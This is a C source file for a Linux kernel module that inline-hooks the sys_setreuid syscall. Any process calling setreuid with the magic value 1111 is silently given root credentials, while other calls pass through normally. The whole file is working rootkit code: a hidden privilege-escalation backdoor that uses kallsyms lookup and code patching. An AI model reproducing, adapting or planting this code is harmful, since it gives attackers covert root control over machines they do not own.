#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/init.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include "hook.c"


unsigned long *syscall_table;
unsigned char* original_code;
typedef asmlinkage long (* original_setreuid_t)(old_uid_t ruid, old_uid_t euid);

typedef unsigned long psize;

psize *o_sys_setreuid;


asmlinkage long my_sys_setreuid(old_uid_t ruid, old_uid_t euid) {
	int result = 0;

	original_setreuid_t original_setreuid = (original_setreuid_t) o_sys_setreuid; 

	if ((ruid == 1111) && (euid == 1111)) {

		printk("priv esc");
		kuid_t kuid = KUIDT_INIT(0);
		kgid_t kgid = KGIDT_INIT(0);

		struct cred *new_cred = prepare_creds();
		if (new_cred == NULL) {
			printk("Failed to prepare new credentials");
			return -1;
		}

		// preparing new Root creds 
		new_cred->uid = kuid;
		new_cred->gid = kgid;
		new_cred->euid = kuid;
		new_cred->egid = kgid;

		// updating the creds of the process
		commit_creds(new_cred);

		printk("removing hook - %p\n", o_sys_setreuid);
		hijack_stop(o_sys_setreuid, original_code);


		result = original_setreuid(0, 0);

		printk("inserting hook - %p %p \n", o_sys_setreuid, my_sys_setreuid);
    	hijack_start(o_sys_setreuid, my_sys_setreuid, &original_code);

    	return result;

	}

	printk("removing hook");
	hijack_stop(o_sys_setreuid, original_code);
	result = original_setreuid(ruid, euid);		

	printk("inserting hook");
	hijack_start(o_sys_setreuid, my_sys_setreuid, &original_code);


	return result;

}


void start_root_hook_inline(void) {
	printk("%i", __NR_setreuid32); 
	
	o_sys_setreuid = (unsigned long *) kallsyms_lookup_name("sys_setreuid");

	printk("setruid - %p \n", o_sys_setreuid);
    hijack_start(o_sys_setreuid, my_sys_setreuid, &original_code);

}

void stop_root_hook_inline(void) {
    hijack_stop(o_sys_setreuid, original_code);
}